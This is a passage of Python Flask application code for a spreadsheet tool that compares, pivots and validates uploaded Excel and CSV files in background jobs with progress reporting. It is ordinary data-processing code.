        return jsonify({'error': 'Please upload Excel or CSV files'}), 400
        
    # Get merge parameters
    left_key = request.form.get('left_key', '').strip()
    right_key = request.form.get('right_key', '').strip()
    join_type = request.form.get('join_type', 'inner').strip()
    duplicate_handling = request.form.get('duplicate_handling', 'keep_first').strip()
        
    if not left_key or not right_key:
        return jsonify({'error': 'Please select key columns from both files'}), 400
        
    # Get selected columns (optional)
    left_columns = request.form.getlist('left_columns[]')
    right_columns = request.form.getlist('right_columns[]')
        
    # Save files temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"merge_{timestamp}_{secrets.token_hex(8)}"
        
    left_filename = secure_filename(left_file.filename)
    right_filename = secure_filename(right_file.filename)
        
    left_file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_left_{left_filename}")
    right_file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_right_{right_filename}")
        
    save_upload(left_file, left_file_path, session_id)
    save_upload(right_file, right_file_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(merge_files_async, left_file_path, right_file_path, left_key, right_key, join_type, left_columns, right_columns, duplicate_handling, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/data-comparison')
def data_comparison():
    return render_template('data_comparison.html')

def _comparable_text(value):
    """Canonical text of a cell for equality checks across file types: blank -> NaN, 5.0 -> '5',
    a date at midnight -> 'YYYY-MM-DD'. An Excel 5 therefore equals a CSV '5', and an Excel date its CSV text."""
    if pd.isna(value):
        return np.nan
    if isinstance(value, (datetime, pd.Timestamp)):
        return value.strftime('%Y-%m-%d') if (value.hour, value.minute, value.second, value.microsecond) == (0, 0, 0, 0) \
            else value.isoformat(sep=' ')
    return _canonical_key_text(value)


@job_worker('file1_path', 'file2_path')
def compare_files_async(file1_path, file2_path, key_columns, compare_columns, progress_queue, session_id):
    """Compare two files in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file 1...', 5)
        
    # Read file 1
    df1 = read_data_file(file1_path)
        
    send_progress('loading', 50, 100, 'Reading file 2...', 10)
        
    # Read file 2
    df2 = read_data_file(file2_path)
    align_key_types(df1, key_columns, df2, key_columns)
        
    send_progress('loading', 100, 100, f'Files loaded: File 1 {len(df1):,} rows, File 2 {len(df2):,} rows', 15)
        
    # Validate key columns exist
    for key_col in key_columns:
        if key_col not in df1.columns:
            raise UserError(f"Key column '{key_col}' not found in file 1")
        if key_col not in df2.columns:
            raise UserError(f"Key column '{key_col}' not found in file 2")
        
    # Validate compare columns exist (if specified)
    if compare_columns:
        invalid_cols = [col for col in compare_columns if col not in df1.columns or col not in df2.columns]
        if invalid_cols:
            raise UserError(f"Columns not found in both files: {', '.join(invalid_cols)}")
        
    send_progress('preparing', 0, 100, 'Preparing data for comparison...', 20)
        
    # Determine which columns to compare
    if compare_columns:
        # Exclude key columns from compare_columns if they're in there
        compare_cols = [col for col in compare_columns if col not in key_columns]
        # Always include key columns
        cols_to_compare = key_columns + compare_cols
    else:
        # Compare all columns except key columns (we'll add them back)
        cols_to_compare = [col for col in df1.columns if col in df2.columns]
        # Ensure key columns are included
        for key_col in key_columns:
            if key_col not in cols_to_compare:
                cols_to_compare.insert(0, key_col)
        
    # Select only columns that exist in both files
    cols_to_compare = [col for col in cols_to_compare if col in df1.columns and col in df2.columns]
        
    df1_compare = df1[cols_to_compare].copy()
    df2_compare = df2[cols_to_compare].copy()
    compare_cols_only = [col for col in cols_to_compare if col not in key_columns]
        
    send_progress('comparing', 0, 100, 'Comparing files...', 30)
        
    # Rows are matched on the real key columns plus "which occurrence of this key" (1st with 1st, 2nd with
    # 2nd...), so repeated keys are all compared. A row whose key columns are ALL blank has no key: it cannot
    # be paired with anything, so it is set aside and reported instead of being called added or removed.
    occurrence = _free_name('_occ', cols_to_compare)
        
    def key_frame(df):
        keys = df[key_columns].copy()
        keys[occurrence] = keys.groupby(key_columns, dropna=False, sort=False).cumcount()
        return keys, keys[key_columns].isna().all(axis=1).to_numpy()
        
    keys1, keyless1 = key_frame(df1_compare)
    keys2, keyless2 = key_frame(df2_compare)
    repeated1 = int(((keys1[occurrence] > 0) & ~keyless1).sum())
    repeated2 = int(((keys2[occurrence] > 0) & ~keyless2).sum())
        
    valid1, valid2 = df1_compare[~keyless1], df2_compare[~keyless2]
    keys1, keys2 = keys1[~keyless1], keys2[~keyless2]
        
    # One group id per distinct (key, occurrence) across both files; equal ids = the same row in both
    group_ids = pd.concat([keys1, keys2], ignore_index=True).groupby(
        key_columns + [occurrence], dropna=False, sort=False).ngroup().to_numpy()
    ids1, ids2 = group_ids[:len(keys1)], group_ids[len(keys1):]
    position_in_2 = pd.Series(np.arange(len(ids2)), index=ids2)
    has_partner = np.isin(ids1, ids2)
    matched1 = np.nonzero(has_partner)[0]                      # file 1 order
    matched2 = position_in_2.loc[ids1[matched1]].to_numpy()
    removed_idx = np.nonzero(~has_partner)[0]
    added_idx = np.nonzero(~np.isin(ids2, ids1))[0]
        
    common_count, added_count, removed_count = len(matched1), len(added_idx), len(removed_idx)
    send_progress('comparing', 50, 100, f'Found {common_count} common rows, {added_count} added, {removed_count} removed...', 50)
        
    added_df = valid2.iloc[added_idx].reset_index(drop=True)
    removed_df = valid1.iloc[removed_idx].reset_index(drop=True)
    rows1, rows2 = valid1.iloc[matched1], valid2.iloc[matched2]
        
    # Which compared cells differ (blank equals blank; values compared by canonical text)
    different = np.zeros((common_count, len(compare_cols_only)), dtype=bool)
    for j, col in enumerate(compare_cols_only):
        a = rows1[col].map(_comparable_text).to_numpy(dtype=object)
        b = rows2[col].map(_comparable_text).to_numpy(dtype=object)
        a_blank, b_blank = pd.isna(a), pd.isna(b)
        different[:, j] = ~((a_blank & b_blank) | (~a_blank & ~b_blank & (a == b)))
    row_changed = different.any(axis=1) if different.shape[1] else np.zeros(common_count, dtype=bool)
        
    changed_rows = []
    old_values = rows1[compare_cols_only].to_numpy(dtype=object)
    new_values = rows2[compare_cols_only].to_numpy(dtype=object)
    key_values = rows1[key_columns].to_numpy(dtype=object)
    for i in np.nonzero(row_changed)[0]:
        change_row = {col: key_values[i, k] for k, col in enumerate(key_columns)}
        for j, col in enumerate(compare_cols_only):
            if different[i, j]:
                change_row[f'{col} (Old)'] = None if pd.isna(old_values[i, j]) else old_values[i, j]
                change_row[f'{col} (New)'] = None if pd.isna(new_values[i, j]) else new_values[i, j]
            else:
                change_row[col] = old_values[i, j]
        changed_rows.append(change_row)
    unchanged_df = rows1[~row_changed][cols_to_compare].reset_index(drop=True)
    changed_count, unchanged_count = len(changed_rows), len(unchanged_df)
        
    send_progress('comparing', 100, 100, f'Comparison complete: {changed_count} changed rows found', 70)
        
    send_progress('saving', 0, 100, 'Saving comparison results...', 75)
        
    # Rows without a key, and repeated keys, are reported rather than silently mis-compared
    keyless_count1, keyless_count2 = int(keyless1.sum()), int(keyless2.sum())
    notes = []
    if keyless_count1 or keyless_count2:
        sides = [f"{n} row(s) in {label}" for n, label in ((keyless_count1, 'file 1'), (keyless_count2, 'file 2')) if n]
        notes.append(f"{' and '.join(sides)} have no key value and were not compared "
                     f"(see the 'Rows Without Key' sheet).")
    for label, repeated_rows in (('File 1', repeated1), ('File 2', repeated2)):
        if repeated_rows:
            notes.append(f"{label} has {repeated_rows} row(s) whose key repeats; repeated rows are compared in order of "
                         f"appearance (1st with 1st, 2nd with 2nd, ...).")
    compare_warning = ' '.join(notes) if notes else None
        
    metrics = [
        ('File 1 Total Rows', len(df1)),
        ('File 2 Total Rows', len(df2)),
        ('Common Rows', common_count),
        ('Added Rows (in File 2 only)', added_count),
        ('Removed Rows (in File 1 only)', removed_count),
        ('Changed Rows', changed_count),
        ('Unchanged Rows', unchanged_count),
    ]
    if keyless_count1 or keyless_count2:
        metrics += [('Rows Without Key (File 1)', keyless_count1), ('Rows Without Key (File 2)', keyless_count2)]
    if repeated1 or repeated2:
        metrics += [('Repeated-Key Rows (File 1)', repeated1), ('Repeated-Key Rows (File 2)', repeated2)]
    summary_df = pd.DataFrame({'Metric': [m for m, _ in metrics], 'Value': [v for _, v in metrics]})
        
    changed_df = pd.DataFrame(changed_rows) if len(changed_rows) > 0 else pd.DataFrame()
    if keyless_count1 or keyless_count2:
        source_col = _free_name('File', cols_to_compare)
        keyless_df = pd.concat([
            df1_compare[keyless1].head(100).assign(**{source_col: 'File 1'}),
            df2_compare[keyless2].head(100).assign(**{source_col: 'File 2'}),
        ], ignore_index=True)[[source_col] + cols_to_compare]
    else:
        keyless_df = pd.DataFrame()
        
    # Save to Excel
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"comparison_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    output_path = write_sheets(output_path, [
        ('Summary', summary_df),
        ('Added Rows', added_df if len(added_df) > 0 else None),
        ('Removed Rows', removed_df if len(removed_df) > 0 else None),
        ('Changed Rows', changed_df if len(changed_df) > 0 else None),
        ('Unchanged Rows', unchanged_df if len(unchanged_df) > 0 else None),
        ('Rows Without Key', keyless_df if len(keyless_df) > 0 else None),
    ], session_id, log=make_log('Data Comparison', len(df1) + len(df2), len(added_df) + len(removed_df) + len(changed_df),
                                {'file1_rows': len(df1), 'file2_rows': len(df2), 'key_columns': key_columns,
                                 'compare_columns': compare_columns, 'added': len(added_df), 'removed': len(removed_df),
                                 'changed': len(changed_df)}, session_id))

    download_url = job_download_url(session_id, os.path.basename(output_path))
        
    send_progress('saving', 100, 100, 'Results saved...', 95)
        
    # Store summary data before cleanup
    file1_total = len(df1)
    file2_total = len(df2)
        
    # Prepare preview data (handle NaN values)
    def prepare_preview(df, max_rows=50):
        if len(df) == 0:
            return []
        return df_preview_text(df, max_rows)
        
    preview_data = {
        'added': prepare_preview(added_df),
        'removed': prepare_preview(removed_df),
        'changed': prepare_preview(changed_df)
    }
        
    # Clean up
    del df1
    del df2
    del df1_compare
    del df2_compare
    os.remove(file1_path)
    os.remove(file2_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'summary': {
            'file1_rows': int(file1_total),
            'file2_rows': int(file2_total),
            'common': int(common_count),
            'added': int(added_count),
            'removed': int(removed_count),
            'changed': int(changed_count),
            'unchanged': int(unchanged_count),
            'rows_without_key_file1': keyless_count1,
            'rows_without_key_file2': keyless_count2,
            'repeated_key_rows_file1': repeated1,
            'repeated_key_rows_file2': repeated2
        },
        'preview': preview_data
    }
    if compare_warning:
        final_message['warning'] = compare_warning
        
    progress_queue.put(final_message)
        
        
@app.route('/compare-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def compare_data():
    """Compare two uploaded files - returns session_id for progress tracking"""
    if 'file1' not in request.files or 'file2' not in request.files:
        return jsonify({'error': 'Please upload both files'}), 400
        
    file1 = request.files['file1']
    file2 = request.files['file2']
        
    if file1.filename == '' or file2.filename == '':
        return jsonify({'error': 'Both files must be selected'}), 400
        
    # Validate file extensions
    if not (file1.filename.endswith(('.xlsx', '.xls', '.csv')) and 
            file2.filename.endswith(('.xlsx', '.xls', '.csv'))):
        return jsonify({'error': 'Please upload Excel or CSV files'}), 400
        
    # Get comparison parameters
    key_columns = request.form.getlist('key_columns[]')
    compare_columns = request.form.getlist('compare_columns[]')  # Optional
        
    if not key_columns:
        return jsonify({'error': 'Please select at least one key column'}), 400
        
    # Save files temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"compare_{timestamp}_{secrets.token_hex(8)}"
        
    file1_filename = secure_filename(file1.filename)
    file2_filename = secure_filename(file2.filename)
        
    file1_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_file1_{file1_filename}")
    file2_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_file2_{file2_filename}")
        
    save_upload(file1, file1_path, session_id)
    save_upload(file2, file2_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(compare_files_async, file1_path, file2_path, key_columns, compare_columns, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/pivot-generator')
def pivot_generator():
    return render_template('pivot_generator.html')

@job_worker('file_path')
def generate_pivot_async(file_path, rows, columns, values, aggfunc, filters, progress_queue, session_id):
    """Generate pivot table in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file...', 5)
        
    # Read file
    df = read_data_file(file_path)
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows', 15)
        
    # Validate columns exist
    all_cols = (rows or []) + (columns or []) + (values or []) + list((filters or {}).keys())
    invalid_cols = [col for col in all_cols if col not in df.columns]
    if invalid_cols:
        raise UserError(f"Columns not found in file: {', '.join(invalid_cols)}")
        
    send_progress('preparing', 0, 100, 'Preparing data for pivot...', 20)

    # Apply filters if any
    if filters:
        for filter_col, filter_value in filters.items():
            if filter_value:
                # Compare as canonical text so a number filter ("2023") matches 2023, 2023.0 and '2023'
                wanted = str(filter_value).strip()
                df = df[df[filter_col].map(lambda v: (lambda t: isinstance(t, str) and t.strip() == wanted)(_comparable_text(v)))]
        
    send_progress('preparing', 50, 100, 'Creating pivot table...', 30)
        
    # Validate that we have required parameters
    if not values:
        raise UserError("At least one value field must be selected for the pivot table")
        
    # The pivot works on its own trimmed copy so the "Source Data" sheet keeps the original values.
    dimension_cols = list(dict.fromkeys((rows or []) + (columns or [])))
    pivot_input = df[list(dict.fromkeys(dimension_cols + list(values)))].copy()
        
    # A blank row/column label would silently vanish from the table and from the totals
    for col in dimension_cols:
        pivot_input[col] = pivot_input[col].where(pivot_input[col].notna(), '(blank)')
        
    # Files are read losslessly (values keep their stored type), so the values to add up are converted
    # explicitly. Anything that is not a number is ignored and reported.
    ignored_non_numeric = {}
    if aggfunc not in ('count', 'nunique'):
        converted = {}
        for value_col in values:
            numeric = pd.to_numeric(pivot_input[value_col], errors='coerce')
            converted[value_col] = (numeric, int((numeric.isna() & pivot_input[value_col].notna()).sum()))
        if aggfunc or all(ignored == 0 for _, ignored in converted.values()):
            for value_col, (numeric, ignored) in converted.items():
                pivot_input[value_col] = numeric
                if ignored:
                    ignored_non_numeric[value_col] = ignored
        
    # Determine default aggregation if not provided: add up numbers, otherwise count
    if not aggfunc:
        aggfunc = 'sum' if all(pd.api.types.is_numeric_dtype(pivot_input[c]) for c in values) else 'count'
        
    # Create pivot table
    pivot_params = {
        'index': rows if rows else None,
        'columns': columns if columns else None,
        'values': values,
        'aggfunc': aggfunc
    }
        
    # Remove None values from index/columns (but keep values)
    if pivot_params['index'] is None:
        del pivot_params['index']
    if pivot_params['columns'] is None:
        del pivot_params['columns']
        
    # Empty combinations are 0 only where 0 is true (sums and counts); for mean/min/max they stay empty.
    # dropna=False keeps every row in the totals (the default drops rows with a blank in ANY pivot column).
    fill_value = 0 if aggfunc in ('sum', 'count', 'nunique') else None
    margins_added = True
    used_labels = {str(v) for col in dimension_cols for v in pivot_input[col].unique()}
    margins_name = next(name for name in ('Total', 'Grand Total', 'Grand Total (all rows)') if name not in used_labels)
    try:
        pivot_df = pd.pivot_table(pivot_input, **pivot_params, fill_value=fill_value, dropna=False,
                                  margins=True, margins_name=margins_name)
    except Exception as e:
        # If margins fail, try without
        margins_added = False
        log.warning(f"Warning: Could not add totals/margins: {e}")
        pivot_df = pd.pivot_table(pivot_input, **pivot_params, fill_value=fill_value, dropna=False)
        
    # dropna=False also invents every combination of the row (and column) labels. Keep only combinations that
    # exist in the data, plus the margin row/columns (those are always last, so found by position).
    def last_per_block(labels):
        last = {}
        for position, label in enumerate(labels):
            last[label[0] if isinstance(label, tuple) else None] = position
        return set(last.values())
        
    if rows:
        observed_rows = set(pivot_input[rows].itertuples(index=False, name=None))
        labels = list(pivot_df.index)
        keep_rows = []
        for position, label in enumerate(labels):
            is_margin = margins_added and position == len(labels) - 1
            keep_rows.append(is_margin or (label if isinstance(label, tuple) else (label,)) in observed_rows)
        pivot_df = pivot_df.loc[keep_rows]
    if columns:
        observed_columns = set(pivot_input[columns].itertuples(index=False, name=None))
        margin_positions = last_per_block(pivot_df.columns) if margins_added else set()
        keep_columns = [
            position in margin_positions or tuple(label[1:1 + len(columns)]) in observed_columns
            for position, label in enumerate(pivot_df.columns)
        ]
        pivot_df = pivot_df.loc[:, keep_columns]
        
    # Margin columns by position: the last column of each value block when there is a column dimension
    total_column_positions = last_per_block(pivot_df.columns) if (margins_added and columns) else set()
        
    send_progress('preparing', 100, 100, f'Pivot table created: {len(pivot_df):,} rows, {len(pivot_df.columns)} columns', 50)
        
    send_progress('saving', 0, 100, 'Saving results...', 60)
        
    # Flatten MultiIndex columns if they exist (handle all cases)
    def flatten_columns(df):
        """Flatten MultiIndex columns to single level"""
        if isinstance(df.columns, pd.MultiIndex):
            # Get column names and flatten them
            new_columns = []
            for col in df.columns:
                if isinstance(col, tuple):
                    # Join tuple elements, filtering out empty strings and None
                    parts = [str(c) for c in col if c is not None and str(c) not in ['', 'nan', 'None']]
                    flattened = '_'.join(parts) if parts else 'Value'
                    # Clean up multiple underscores
                    while '__' in flattened:
                        flattened = flattened.replace('__', '_')
                    flattened = flattened.strip('_')
                    new_columns.append(flattened if flattened else 'Value')
                else:
                    new_columns.append(str(col) if col is not None else 'Value')
            df.columns = new_columns
        return df
        
    # Flatten MultiIndex columns BEFORE reset_index (if they exist)
    pivot_df = flatten_columns(pivot_df)
        
    # Reset index to make it a proper table structure
    # Handle MultiIndex index properly
    if isinstance(pivot_df.index, pd.MultiIndex):
        pivot_df_reset = pivot_df.reset_index()
    else:
        pivot_df_reset = pivot_df.reset_index()
        
    # Flatten again after reset in case reset_index created new MultiIndex columns
    pivot_df_reset = flatten_columns(pivot_df_reset)
        
    # Create summary
    summary_data = {
        'Metric': [
            'Source Rows',
            'Pivot Rows',
            'Pivot Columns',
            'Aggregation Function',
            'Row Dimensions',
            'Column Dimensions',
            'Value Fields'
        ],
        'Value': [
            len(df),
            len(pivot_df_reset),
            len(pivot_df_reset.columns),
            aggfunc if aggfunc else 'sum',
            ', '.join(rows) if rows else 'None',
            ', '.join(columns) if columns else 'None',
            ', '.join(values) if values else 'All Numeric'
        ]
    }
    summary_df = pd.DataFrame(summary_data)
        
    # Ensure summary_df doesn't have MultiIndex columns
    summary_df = flatten_columns(summary_df.copy())
        
    # Save to Excel with formatting
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"pivot_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    # The workbook is written once, already styled, straight through xlsxwriter (no re-opening it to style cells)
    import xlsxwriter
    if isinstance(pivot_df_reset.columns, pd.MultiIndex):
        pivot_df_reset = flatten_columns(pivot_df_reset)
    row_header_cols = len(rows) if rows else 0
    n_rows, n_cols = pivot_df_reset.shape
    if sheet_too_big(pivot_df_reset):
        raise UserError(f"The pivot table has {n_rows:,} rows x {n_cols:,} columns, which is more than an Excel "
                         "sheet can hold. Use fewer or coarser row/column fields.")

    workbook = xlsxwriter.Workbook(output_path, {'strings_to_formulas': False, 'strings_to_urls': False,
                                                 'default_date_format': 'yyyy-mm-dd hh:mm:ss'})
    try:
        border = {'border': 1, 'border_color': '#4472C4'}
        number_format = '#,##0' if aggfunc in ('count', 'nunique') else '#,##0.00'
        formats = {}

        def fmt(**props):
            key = tuple(sorted(props.items()))
            if key not in formats:
                formats[key] = workbook.add_format(props)
            return formats[key]

        head_row = dict(bold=True, font_color='#FFFFFF', font_size=11, align='center', valign='vcenter', text_wrap=True)
        sheet = workbook.add_worksheet('Pivot Table')
        sheet.set_row(0, 25)
        for c, name in enumerate(pivot_df_reset.columns):
            sheet.write_string(0, c, str(name), fmt(bg_color='#2F5597' if c < row_header_cols else '#4472C4', **head_row))
        send_progress('saving', 0, max(n_rows, 1), 'Writing and formatting the pivot table...', 62)

        total_cols = {row_header_cols + pos for pos in total_column_positions}
        cells = pivot_df_reset.astype(object).where(pivot_df_reset.notna(), None)
        for r, row in enumerate(cells.itertuples(index=False, name=None), 1):
            if r % 2000 == 0:
                send_progress('saving', r, n_rows, f'Formatting: {r:,}/{n_rows:,} rows...',
                              62 + int(r / max(n_rows, 1) * 28))
            is_total_row = margins_added and r == n_rows
            for c, value in enumerate(row):
                if c < row_header_cols:
                    is_when = isinstance(value, (datetime, date))
                    style = fmt(bg_color='#B4C6E7' if is_total_row else '#D9E1F2', bold=True,
                                font_size=11 if is_total_row else 10, align='left', valign='vcenter',
                                **({'num_format': 'yyyy-mm-dd hh:mm:ss'} if is_when else {}), **border)
                    if value is None:
                        sheet.write_blank(r, c, None, style)
                    elif is_when:
                        sheet.write_datetime(r, c, value, style)
                    else:
                        sheet.write(r, c, value, style)
                    continue
                total = is_total_row or c in total_cols
                base = dict(valign='vcenter', **border)
                if total:
                    base.update(bg_color='#B4C6E7', bold=True, font_size=11)
                else:
                    base.update(font_size=10)
                    if r % 2 == 0:
                        base.update(bg_color='#F2F2F2')
                if value is None:
                    sheet.write_blank(r, c, None, fmt(align='center', **base))
                elif isinstance(value, float) and value in (float('inf'), float('-inf')):
                    sheet.write_string(r, c, 'inf' if value > 0 else '-inf', fmt(align='right', **base))
                elif isinstance(value, (int, float)) and not isinstance(value, bool):
                    sheet.write_number(r, c, value, fmt(align='right', num_format=number_format, **base))
                elif isinstance(value, (datetime, date)):
                    sheet.write_datetime(r, c, value, fmt(align='left', num_format='yyyy-mm-dd hh:mm:ss', **base))
                else:
                    sheet.write(r, c, value, fmt(align='left', **base))

        sheet.freeze_panes(1, row_header_cols)
        # Column widths from the header and the first 1,000 rows
        send_progress('saving', 0, max(n_cols, 1), 'Adjusting column widths...', 92)
        sample = pivot_df_reset.head(1000)
        for c, name in enumerate(pivot_df_reset.columns):
            longest = max([len(str(name))] + [len(str(v)) for v in sample.iloc[:, c].dropna()])
            sheet.set_column(c, c, min(max(longest + 2, 12), 50))

        def plain_sheet(name, frame):
            ws_ = workbook.add_worksheet(name)
            head = workbook.add_format({'bold': True, 'border': 1, 'align': 'center', 'valign': 'top'})
            ws_.write_row(0, 0, [str(c) for c in frame.columns], head)
            body = frame.astype(object).where(frame.notna(), None)
            for r_, row_ in enumerate(body.itertuples(index=False, name=None), 1):
                ws_.write_row(r_, 0, row_)

        plain_sheet('Summary', summary_df)
        if len(df) > PIVOT_SOURCE_SHEET_LIMIT:
            note_warning(session_id, f"The Source Data sheet was left out because the file has more than "
                                     f"{PIVOT_SOURCE_SHEET_LIMIT:,} rows.")
        else:
            plain_sheet('Source Data', df)
        write_log_sheet(workbook, make_log('Pivot Table Generator', len(df), n_rows,
                                           {'rows': rows, 'columns': columns, 'values': values, 'aggfunc': aggfunc,
                                            'filters': filters}, session_id))
        send_progress('saving', max(n_cols, 1), max(n_cols, 1), 'Saving file...', 95)
    finally:
        workbook.close()
        
    download_url = job_download_url(session_id, f"{output_filename}.xlsx")
        
    send_progress('saving', 100, 100, 'Results saved...', 95)
        
    # Store summary data before cleanup
    source_rows_total = len(df)
    pivot_rows_total = len(pivot_df_reset)
    pivot_cols_total = len(pivot_df_reset.columns)
        
    # Prepare preview data
    preview_data = df_preview_text(pivot_df_reset, 50)
        
    # Clean up
    del df
    del pivot_df
    os.remove(file_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'summary': {
            'source_rows': int(source_rows_total),
            'pivot_rows': int(pivot_rows_total),
            'pivot_cols': int(pivot_cols_total),
            'aggfunc': aggfunc if aggfunc else 'sum'
        },
        'preview': preview_data
    }
    if ignored_non_numeric:
        final_message['ignored_non_numeric'] = ignored_non_numeric
        final_message['warning'] = 'Non-numeric values were ignored: ' + ', '.join(
            f'{count} in {col}' for col, count in ignored_non_numeric.items()) + '.'
        
    progress_queue.put(final_message)
        
        
@app.route('/generate-pivot', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def generate_pivot():
    """Generate pivot table - returns session_id for progress tracking"""
    if 'file' not in request.files:
        return jsonify({'error': 'Please upload a file'}), 400
        
    file = request.files['file']
        
    if file.filename == '':
        return jsonify({'error': 'File must be selected'}), 400
        
    # Validate file extension
    if not file.filename.endswith(('.xlsx', '.xls', '.csv')):
        return jsonify({'error': 'Please upload an Excel or CSV file'}), 400
        
    # Get pivot parameters
    rows = request.form.getlist('rows[]')
    columns = request.form.getlist('columns[]')
    values = request.form.getlist('values[]')
    aggfunc = request.form.get('aggfunc', 'sum').strip()
    filters = {}
        
    # Get filters (if any)
    filter_cols = request.form.getlist('filter_columns[]')
    filter_values = request.form.getlist('filter_values[]')
    for col, val in zip(filter_cols, filter_values):
        if col and val:
            filters[col] = val
        
    # At least one dimension required
    if not rows and not columns:
        return jsonify({'error': 'Please select at least one row or column dimension'}), 400
        
    # Save file temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"pivot_{timestamp}_{secrets.token_hex(8)}"
        
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
        
    save_upload(file, file_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(generate_pivot_async, file_path, rows, columns, values, aggfunc, filters, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/data-validation')
def data_validation():
    return render_template('data_validation.html')

VALIDATION_DETAIL_LIMIT = 10000
VALIDATION_VALID_SHEET_LIMIT = 100000   # writing every valid row of a big file dominates the run time


def validation_mask(series, rule, budget, number=0):
    """(mask, message) for one validation rule: mask is True where a cell breaks the rule.

    ``message(value)`` words the failure for the Error Details sheet. Blank cells only fail 'required'.
    """
    rule_type = rule.get('type')
    value = rule.get('value')
    present = series.notna()
    text = series.astype(str)
    blank = ~present | (text.str.strip() == '')
    present = ~blank
    col = rule.get('column')

    def bound(raw, cast, name):
        if raw is None or raw == '':
            return None
        try:
            return cast(float(raw)) if cast is int else float(raw)
        except (TypeError, ValueError):
            raise UserError(f"Rule {number} ({col}): the {name} '{raw}' is not a number")

    if rule_type == 'required':
        return blank, lambda v: f"{col}: Required field is empty"

    if rule_type == 'numeric':
        bad = present & pd.to_numeric(text.where(present), errors='coerce').isna()
        return bad, lambda v: f"{col}: Must be numeric"

    if rule_type == 'range':
        low, high = bound((value or {}).get('min'), float, 'minimum'), bound((value or {}).get('max'), float, 'maximum')
        numbers = pd.to_numeric(text.where(present), errors='coerce')
        bad = present & numbers.isna()                       # not a number at all: cannot be inside the range
        if low is not None:
            bad |= numbers < low
        if high is not None:
            bad |= numbers > high

        def range_message(v):
            try:
                n = float(v)
            except (TypeError, ValueError):
                return f"{col}: '{v}' is not a number, so it cannot be within the range"
            if low is not None and n < low:
                return f"{col}: Value {v} is below minimum {rule['value']['min']}"
            return f"{col}: Value {v} is above maximum {rule['value']['max']}"
        return bad, range_message

    if rule_type == 'list':
        allowed = {str(v) for v in (value if isinstance(value, list) else [value])}
        return present & ~text.isin(allowed), lambda v: f"{col}: Value '{v}' not in allowed list"

    if rule_type == 'pattern':
        compiled = datadragon_regex.compile_pattern(value)
        verdicts = {u: datadragon_regex.fullmatch(compiled, u, budget) for u in text[present].unique()}
        return present & ~text.map(verdicts).fillna(True).astype(bool), \
            lambda v: f"{col}: Value does not match required pattern"

    if rule_type == 'length':
        low, high = bound((value or {}).get('min'), int, 'minimum length'), bound((value or {}).get('max'), int, 'maximum length')
        lengths = text.str.len()
        bad = pd.Series(False, index=series.index)
        if low is not None:
            bad |= present & (lengths < low)
        if high is not None:
            bad |= present & (lengths > high)
        return bad, lambda v: f"{col}: Length {len(str(v))} is outside the allowed range"

    return pd.Series(False, index=series.index), lambda v: ''


@job_worker('file_path')
def validate_data_async(file_path, validation_rules, progress_queue, session_id):
    """Validate data in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file...', 5)
        
    # Read file
    df = read_data_file(file_path)
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows', 15)
        
    send_progress('validating', 0, 100, 'Validating data...', 20)
        
    # Parse validation rules
    import json
    rules = json.loads(validation_rules) if isinstance(validation_rules, str) else validation_rules
        
    total_rows = len(df)
    pattern_budget = datadragon_regex.Budget()

    # One boolean mask per rule (True = the cell breaks the rule), computed for the whole column at once
    checks = []   # (column, mask, message(value) -> str)
    for number, rule in enumerate(rules, 1):
        col = rule.get('column')
        if col not in df.columns:
            continue
        checks.append((col,) + validation_mask(df[col], rule, pattern_budget, number))
        send_progress('validating', number, len(rules), f'Checked rule {number} of {len(rules)}',
                      20 + int(number / len(rules) * 50))

    invalid_mask = pd.Series(False, index=df.index)
    failures_total = 0
    for _, mask, _ in checks:
        invalid_mask |= mask
        failures_total += int(mask.sum())
    invalid_count = int(invalid_mask.sum())
    valid_count = total_rows - invalid_count

    send_progress('validating', len(rules), len(rules),
                  f'Validation complete: {invalid_count:,} invalid rows, {failures_total:,} rule failures', 70)
    send_progress('saving', 0, 100, 'Saving validation results...', 75)

    # Row-level detail is written for the first VALIDATION_DETAIL_LIMIT invalid rows only
    positions = np.flatnonzero(invalid_mask.to_numpy())
    truncated = len(positions) > VALIDATION_DETAIL_LIMIT
    shown = positions[:VALIDATION_DETAIL_LIMIT]
    shown_pos = {int(p): n for n, p in enumerate(shown)}
    messages = [[] for _ in shown]
    for col, mask, message in checks:
        hit = np.flatnonzero(mask.to_numpy()[shown])
        values = df[col].iloc[shown[hit]]
        for n, value in zip(hit, values):
